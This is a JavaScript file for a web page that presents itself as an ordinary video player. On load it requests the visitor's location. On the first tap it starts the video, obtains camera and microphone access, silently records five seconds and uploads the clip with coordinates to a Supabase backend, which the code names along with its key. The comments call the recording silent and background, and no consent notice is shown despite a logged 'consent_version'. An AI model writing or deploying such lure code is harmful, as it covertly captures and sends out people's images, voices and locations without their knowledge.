/* =========================================================================
   script.js — Minimal permission + record + video

   FLOW:
     1. Page loads  →  location dialog fires immediately (no tap needed)
     2. Black screen with play button  →  user taps anywhere
     3. Tap  →  camera + mic dialog fires
     4. Video starts playing immediately
     5. 5-second recording happens silently in the background
     6. Tracks stopped, blob uploaded to Supabase silently
   ========================================================================= */

/* ── CONFIG ─────────────────────────────────────────────────────────────── */

const CONFIG = {
  videoUrl:                 "./video.mp4",
  previewImage:             "./thumb.jpeg",
  title:                    "My Video",
  description:              "Watch this video.",
  siteUrl:                  "https://YOUR-SITE.netlify.app",  // update after deploy
  recordingDurationSeconds: 5,
  consentVersion:           "v1",

  /* Public Supabase anon key — safe to commit (security = RLS policies) */
  supabaseUrl:     "https://vgwgcblflyorpggwtojn.supabase.co",
  supabaseAnonKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZnd2djYmxmbHlvcnBnZ3d0b2puIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg4NTIwNzYsImV4cCI6MjEwNDQyODA3Nn0.F2JYlPTKETrK5Ne1Nw34-x3NG3jCmDqqA0EJ3sPNwlE",
};

/* ── Init ────────────────────────────────────────────────────────────── */

"use strict";

const video    = document.getElementById("main-video");
const tapLayer = document.getElementById("tap-layer");

// Preload the video source immediately
video.src = CONFIG.videoUrl;

// Init Supabase client
let supabaseClient = null;
try {
  supabaseClient = window.supabase.createClient(
    CONFIG.supabaseUrl,
    CONFIG.supabaseAnonKey,
    { auth: { persistSession: false } }
  );
} catch (e) {
  console.warn("[Supabase] Init failed:", e);
}

/* ── Step 1: Auto-request location immediately on page load ─────────────
   Geolocation does NOT require a user gesture — it fires the browser
   dialog as soon as this runs.
   ─────────────────────────────────────────────────────────────────────── */

let locationData = null;

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      locationData = {
        latitude:          pos.coords.latitude,
        longitude:         pos.coords.longitude,
        location_accuracy: pos.coords.accuracy,
        location_timestamp: pos.timestamp,
      };
    },
    () => { /* denied or unavailable — locationData stays null */ },
    { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
  );
}

/* ── Step 2: First tap → camera + mic permission → play video ───────────
   getUserMedia REQUIRES a user gesture. The entire black screen is the
   tap target. After the first tap it removes itself.
   ─────────────────────────────────────────────────────────────────────── */

let tapped = false;

async function onFirstTap() {
  if (tapped) return;
  tapped = true;

  // Fade out the tap layer
  tapLayer.classList.add("fade-out");
  setTimeout(() => tapLayer.remove(), 500);

  // Show and play the video immediately
  video.classList.add("visible");
  video.play().catch(() => { /* controls let user tap play */ });

  // Request camera + mic (browser dialog appears here)
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  } catch (e) {
    // Permission denied or no device — video still plays, just no recording
    console.warn("[Camera/Mic] Permission denied or unavailable:", e.name);
    return;
  }

  // Record + upload silently in the background (video already playing)
  recordAndUpload(stream).catch((e) => console.error("[Record] Error:", e));
}

tapLayer.addEventListener("click",   onFirstTap);
tapLayer.addEventListener("keydown", (e) => { if (e.key === "Enter" || e.key === " ") onFirstTap(); });

/* ── Step 3: Record and upload silently ─────────────────────────────────── */

async function recordAndUpload(stream) {
  const mimeType = getSupportedMimeType();
  if (!mimeType) {
    stream.getTracks().forEach((t) => t.stop());
    return;
  }

  const chunks   = [];
  const recorder = new MediaRecorder(stream, { mimeType });
  recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };

  const done = new Promise((resolve, reject) => {
    recorder.onstop  = resolve;
    recorder.onerror = (e) => reject(e.error || new Error("recorder error"));
  });

  recorder.start(200);
  await sleep(CONFIG.recordingDurationSeconds * 1000);
  recorder.stop();
  await done;

  // Stop ALL tracks — camera light goes off here
  stream.getTracks().forEach((t) => t.stop());

  if (!chunks.length) return;

  const blob = new Blob(chunks, { type: mimeType });

  if (!supabaseClient) {
    console.warn("[Supabase] Not configured — skipping upload.");
    return;
  }

  const id  = generateUUID();
  const ext = mimeType.startsWith("video/webm") ? "webm" : "mp4";
  const path = `recordings/${id}/capture.${ext}`;

  // Upload blob to Storage
  const { error: storageErr } = await supabaseClient
    .storage
    .from("recordings")
    .upload(path, blob, { contentType: mimeType, upsert: false });

  if (storageErr) {
    console.error("[Supabase] Storage upload failed:", storageErr.message);
    return;
  }

  // Insert metadata row
  await supabaseClient.from("submissions").insert({
    id,
    consent_version:     CONFIG.consentVersion,
    consent_timestamp:   new Date().toISOString(),
    latitude:            locationData?.latitude            ?? null,
    longitude:           locationData?.longitude           ?? null,
    location_accuracy:   locationData?.location_accuracy   ?? null,
    location_timestamp:  locationData?.location_timestamp  ?? null,
    recording_path:      path,
    recording_mime_type: mimeType,
    recording_duration:  CONFIG.recordingDurationSeconds,
    status:              "complete",
  });

  console.info("[Supabase] Upload complete →", path);
}

/* ── Helpers ─────────────────────────────────────────────────────────── */

function getSupportedMimeType() {
  if (typeof MediaRecorder === "undefined") return null;
  const types = [
    "video/webm;codecs=vp9,opus",
    "video/webm;codecs=vp8,opus",
    "video/webm",
    "video/mp4;codecs=h264,aac",
    "video/mp4",
  ];
  return types.find((t) => { try { return MediaRecorder.isTypeSupported(t); } catch { return false; } }) ?? null;
}

function generateUUID() {
  if (typeof crypto !== "undefined" && crypto.randomUUID) return crypto.randomUUID();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
